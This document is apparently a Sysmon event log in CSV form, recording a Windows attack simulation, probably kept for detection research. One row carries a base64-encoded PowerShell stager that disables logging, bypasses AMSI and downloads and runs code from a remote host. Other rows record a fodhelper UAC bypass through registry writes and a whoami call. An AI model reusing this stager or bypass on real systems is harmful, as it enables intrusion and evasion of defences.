,UtcTime,ProcessId,EventID,User,Image,ImageLoaded,CommandLine,ParentImage,ParentCommandLine,DestinationPort,Protocol,QueryName,TargetFilename,TargetObject
2835,2020-05-12 14:54:28.558,1936,11,,C:\Windows\system32\svchost.exe,,,,,,,,C:\Windows\Prefetch\CONSENT.EXE-40419367.pf,
2837,2020-05-12 14:54:28.543,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\ole32.dll,,,,,,,,
2838,2020-05-12 14:54:27.296,9116,3,DESKTOP-TATBGQH\anon,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,8080,tcp,,,
2839,2020-05-12 14:54:28.527,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\propsys.dll,,,,,,,,
2840,2020-05-12 14:54:28.512,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\iertutil.dll,,,,,,,,
2841,2020-05-12 14:54:28.512,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\urlmon.dll,,,,,,,,
2842,2020-05-12 14:54:28.449,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\gpapi.dll,,,,,,,,
2843,2020-05-12 14:54:28.433,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\cryptbase.dll,,,,,,,,
2844,2020-05-12 14:54:28.433,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\bcrypt.dll,,,,,,,,
2845,2020-05-12 14:54:28.433,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\rsaenh.dll,,,,,,,,
2846,2020-05-12 14:54:28.433,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\amsiproxy.dll,,,,,,,,
2847,2020-05-12 14:54:28.418,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\clbcatq.dll,,,,,,,,
2848,2020-05-12 14:54:28.418,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\wintrust.dll,,,,,,,,
2849,2020-05-12 14:54:28.402,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\uxtheme.dll,,,,,,,,
2850,2020-05-12 14:54:28.402,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\kernel.appcore.dll,,,,,,,,
2851,2020-05-12 14:54:28.402,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\shlwapi.dll,,,,,,,,
2852,2020-05-12 14:54:28.402,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\umpdc.dll,,,,,,,,
2853,2020-05-12 14:54:28.402,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\powrprof.dll,,,,,,,,
2854,2020-05-12 14:54:28.402,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\windows.storage.dll,,,,,,,,
2855,2020-05-12 14:54:28.402,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\SHCore.dll,,,,,,,,
2856,2020-05-12 14:54:28.402,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\cfgmgr32.dll,,,,,,,,
2857,2020-05-12 14:54:28.387,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\shell32.dll,,,,,,,,
2858,2020-05-12 14:54:28.293,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\msutb.dll,,,,,,,,
2859,2020-05-12 14:54:28.293,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\advapi32.dll,,,,,,,,
2860,2020-05-12 14:54:28.293,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\imm32.dll,,,,,,,,
2861,2020-05-12 14:54:28.293,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\oleaut32.dll,,,,,,,,
2862,2020-05-12 14:54:28.293,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\msctf.dll,,,,,,,,
2863,2020-05-12 14:54:28.293,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\wtsapi32.dll,,,,,,,,
2864,2020-05-12 14:54:28.293,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\MsCtfMonitor.dll,,,,,,,,
2865,2020-05-12 14:54:28.293,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\msimg32.dll,,,,,,,,
2866,2020-05-12 14:54:28.293,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\winsta.dll,,,,,,,,
2867,2020-05-12 14:54:28.293,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\cryptsp.dll,,,,,,,,
2868,2020-05-12 14:54:28.293,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\profapi.dll,,,,,,,,
2869,2020-05-12 14:54:28.293,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\WinSxS\amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.657_none_e6c5b579130e3898\comctl32.dll,,,,,,,,
2870,2020-05-12 14:54:28.293,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\amsi.dll,,,,,,,,
2871,2020-05-12 14:54:28.293,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\userenv.dll,,,,,,,,
2872,2020-05-12 14:54:28.293,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\wmsgapi.dll,,,,,,,,
2873,2020-05-12 14:54:28.277,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\sechost.dll,,,,,,,,
2874,2020-05-12 14:54:28.277,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\sechost.dll,,,,,,,,
2875,2020-05-12 14:54:28.277,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\msasn1.dll,,,,,,,,
2876,2020-05-12 14:54:28.277,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\sspicli.dll,,,,,,,,
2877,2020-05-12 14:54:28.277,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\crypt32.dll,,,,,,,,
2878,2020-05-12 14:54:28.277,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\bcryptprimitives.dll,,,,,,,,
2879,2020-05-12 14:54:28.277,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\rpcrt4.dll,,,,,,,,
2880,2020-05-12 14:54:28.277,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\combase.dll,,,,,,,,
2881,2020-05-12 14:54:28.277,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\msvcrt.dll,,,,,,,,
2882,2020-05-12 14:54:28.277,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\user32.dll,,,,,,,,
2883,2020-05-12 14:54:28.277,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\ucrtbase.dll,,,,,,,,
2884,2020-05-12 14:54:28.277,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\msvcp_win.dll,,,,,,,,
2885,2020-05-12 14:54:28.277,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\gdi32full.dll,,,,,,,,
2886,2020-05-12 14:54:28.277,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\win32u.dll,,,,,,,,
2887,2020-05-12 14:54:28.277,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\gdi32.dll,,,,,,,,
2888,2020-05-12 14:54:28.277,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\KernelBase.dll,,,,,,,,
2889,2020-05-12 14:54:28.277,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\kernel32.dll,,,,,,,,
2890,2020-05-12 14:54:28.246,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\ntdll.dll,,,,,,,,
2891,2020-05-12 14:54:28.246,8704,7,,C:\Windows\System32\consent.exe,C:\Windows\System32\consent.exe,,,,,,,,
2892,2020-05-12 14:54:28.247,8704,1,NT AUTHORITY\SYSTEM,C:\Windows\System32\consent.exe,,consent.exe 10512 324 000001E6D2E90490,C:\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k netsvcs -p -s Appinfo,,,,,
2893,2020-05-12 14:54:28.231,9116,7,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\mpr.dll,,,,,,,,
2895,2020-05-12 14:54:28.215,6432,7,,C:\Windows\System32\fodhelper.exe,C:\Windows\System32\ntdll.dll,,,,,,,,
2896,2020-05-12 14:54:28.215,6432,7,,C:\Windows\System32\fodhelper.exe,C:\Windows\System32\fodhelper.exe,,,,,,,,
2897,2020-05-12 14:54:28.225,6432,1,DESKTOP-TATBGQH\anon,C:\Windows\System32\fodhelper.exe,,"""C:\Windows\system32\fodhelper.exe"" ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAUwBpAE8ATgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBJAG8ATgAuAE0AQQBqAG8AUgAgAC0ARwBlACAAMwApAHsAJABHAFAARgA9AFsAcgBFAGYAXQAuAEEAUwBTAEUATQBiAEwAeQAuAEcARQBUAFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAEkAZQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAdABWAGEATABVAGUAKAAkAG4AVQBMAEwAKQA7AEkARgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAQQBMAD0AWwBDAG8ATABMAGUAQwB0AGkAbwBOAHMALgBHAGUAbgBlAFIASQBDAC4ARABJAEMAVABpAG8AbgBhAHIAWQBbAFMAVAByAGkAbgBnACwAUwB5AFMAVABlAE0ALgBPAGIASgBlAEMAVABdAF0AOgA6AE4AZQB3ACgAKQA7ACQAVgBhAGwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBBAEwALgBBAEQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAGEAbAB9AEUAbABzAEUAewBbAFMAYwByAGkAUAB0AEIATABPAGMASwBdAC4AIgBHAGUAdABGAGkARQBgAEwAZAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAHQAVgBBAEwAdQBlACgAJABuAFUATABsACwAKABOAGUAVwAtAE8AYgBqAGUAYwBUACAAQwBvAEwAbABFAEMAdABpAE8AbgBzAC4ARwBlAG4AZQBSAEkAYwAuAEgAYQBTAGgAUwBlAHQAWwBzAHQAcgBpAE4ARwBdACkAKQB9AFsAUgBlAGYAXQAuAEEAUwBzAEUATQBiAGwAWQAuAEcAZQBUAFQAeQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBFAFQARgBJAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEATAB1AEUAKAAkAG4AVQBMAEwALAAkAFQAUgB1AGUAKQB9ADsAfQA7AFsAUwB5AFMAVABFAG0ALgBOAEUAdAAuAFMAZQByAFYASQBjAEUAUABvAGkAbgB0AE0AQQBOAGEARwBFAFIAXQA6ADoARQBYAHAAZQBDAHQAMQAwADAAQwBvAE4AVABpAG4AdQBFAD0AMAA7ACQAdwBDAD0ATgBlAHcALQBPAGIASgBlAGMAVAAgAFMAeQBzAFQARQBtAC4ATgBFAHQALgBXAEUAQgBDAGwASQBFAE4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAFcAYwAuAEgAZQBBAGQAZQBSAFMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAQwAuAFAAcgBPAFgAWQA9AFsAUwBZAHMAVABFAE0ALgBOAEUAdAAuAFcAZQBiAFIAZQBRAHUAZQBzAFQAXQA6ADoARABlAGYAYQBVAGwAVABXAGUAQgBQAHIATwB4AFkAOwAkAHcAQwAuAFAAcgBvAHgAWQAuAEMAUgBlAGQAZQBuAFQASQBBAGwAUwAgAD0AIABbAFMAWQBzAFQARQBtAC4ATgBFAFQALgBDAFIAZQBkAEUATgB0AGkAYQBsAEMAQQBjAEgAZQBdADoAOgBEAEUARgBBAFUAbABUAE4AZQBUAHcAbwByAEsAQwByAGUARABFAE4AVABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAHMAVABlAE0ALgBUAEUAeABUAC4ARQBuAEMAbwBkAGkATgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQBUAEIAeQB0AEUAcwAoACcARAAqADEAQQA1ADsASwBmAHQAXgB7AHMASgA4AGwAQABSAF8APABaAG4ASQBkADcAPgB+AEIANgBFAFMAbwBlACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAFUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABPAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMgA0AC4AMQAzADUAOgA4ADAAOAAwACcAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJABXAEMALgBIAEUAQQBEAGUAcgBzAC4AQQBkAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAZQBzAHMAaQBvAG4APQBqAHMAagBkAG0AMABoAE4AagBIAHgAYgBaAEcASABrAGEAeQBpACsAcgBOAFkAYwBKAFYAcwA9ACIAKQA7ACQARABhAHQAQQA9ACQAVwBDAC4ARABvAFcATgBsAG8AQQBEAEQAYQBUAGEAKAAkAHMARQByACsAJABUACkAOwAkAGkAdgA9ACQAZABhAFQAQQBbADAALgAuADMAXQA7ACQARABBAFQAYQA9ACQAZABhAFQAQQBbADQALgAuACQARABBAHQAQQAuAEwARQBOAGcAVABoAF0AOwAtAEoAbwBpAE4AWwBDAGgAQQByAFsAXQBdACgAJgAgACQAUgAgACQAZABBAHQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA",,,,,
2898,2020-05-12 14:54:28.215,9116,7,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\OneCoreUAPCommonProxyStub.dll,,,,,,,,
2899,2020-05-12 14:54:28.121,9116,7,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\OneCoreCommonProxyStub.dll,,,,,,,,
2900,2020-05-12 14:54:28.105,9116,7,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\sppc.dll,,,,,,,,
2901,2020-05-12 14:54:28.105,9116,7,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\BCP47Langs.dll,,,,,,,,
2902,2020-05-12 14:54:28.105,9116,7,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\slc.dll,,,,,,,,
2903,2020-05-12 14:54:28.105,9116,7,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\AppResolver.dll,,,,,,,,
2904,2020-05-12 14:54:28.105,9116,7,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\WinTypes.dll,,,,,,,,
2905,2020-05-12 14:54:28.074,9116,7,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\fltLib.dll,,,,,,,,
2906,2020-05-12 14:54:28.074,9116,7,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cldapi.dll,,,,,,,,
2907,2020-05-12 14:54:28.074,9116,7,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\iertutil.dll,,,,,,,,
2908,2020-05-12 14:54:28.074,9116,7,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\urlmon.dll,,,,,,,,
2909,2020-05-12 14:54:28.058,9116,7,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\Windows.StateRepositoryPS.dll,,,,,,,,
2910,2020-05-12 14:54:28.043,9116,7,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\edputil.dll,,,,,,,,
2911,2020-05-12 14:54:28.027,9116,7,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\propsys.dll,,,,,,,,
2912,2020-05-12 14:54:28.012,9116,13,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,,,,,HKU\S-1-5-21-4030902508-3395263147-86901672-1000_Classes\ms-settings\Shell\Open\command\(Default)
2913,2020-05-12 14:54:27.996,9116,13,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,,,,,HKU\S-1-5-21-4030902508-3395263147-86901672-1000_Classes\ms-settings\Shell\Open\command\DelegateExecute
2915,2020-05-12 14:54:27.605,9344,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\imm32.dll,,,,,,,,
2916,2020-05-12 14:54:27.590,9344,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\bcrypt.dll,,,,,,,,
2917,2020-05-12 14:54:27.590,9344,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\netutils.dll,,,,,,,,
2918,2020-05-12 14:54:27.590,9344,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\wkscli.dll,,,,,,,,
2919,2020-05-12 14:54:27.590,9344,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\sspicli.dll,,,,,,,,
2920,2020-05-12 14:54:27.590,9344,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\version.dll,,,,,,,,
2921,2020-05-12 14:54:27.590,9344,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\authz.dll,,,,,,,,
2922,2020-05-12 14:54:27.590,9344,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\bcryptprimitives.dll,,,,,,,,
2923,2020-05-12 14:54:27.590,9344,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\combase.dll,,,,,,,,
2924,2020-05-12 14:54:27.590,9344,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\shlwapi.dll,,,,,,,,
2925,2020-05-12 14:54:27.590,9344,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\ws2_32.dll,,,,,,,,
2926,2020-05-12 14:54:27.590,9344,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\ucrtbase.dll,,,,,,,,
2927,2020-05-12 14:54:27.590,9344,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\msvcp_win.dll,,,,,,,,
2928,2020-05-12 14:54:27.590,9344,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\gdi32full.dll,,,,,,,,
2929,2020-05-12 14:54:27.590,9344,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\gdi32.dll,,,,,,,,
2930,2020-05-12 14:54:27.590,9344,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\win32u.dll,,,,,,,,
2931,2020-05-12 14:54:27.590,9344,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\user32.dll,,,,,,,,
2932,2020-05-12 14:54:27.590,9344,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\rpcrt4.dll,,,,,,,,
2933,2020-05-12 14:54:27.590,9344,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\sechost.dll,,,,,,,,
2934,2020-05-12 14:54:27.590,9344,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\msvcrt.dll,,,,,,,,
2935,2020-05-12 14:54:27.590,9344,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\advapi32.dll,,,,,,,,
2936,2020-05-12 14:54:27.574,9344,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\KernelBase.dll,,,,,,,,
2937,2020-05-12 14:54:27.574,9344,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\kernel32.dll,,,,,,,,
2938,2020-05-12 14:54:27.574,9344,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\ntdll.dll,,,,,,,,
2939,2020-05-12 14:54:27.574,9344,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\whoami.exe,,,,,,,,
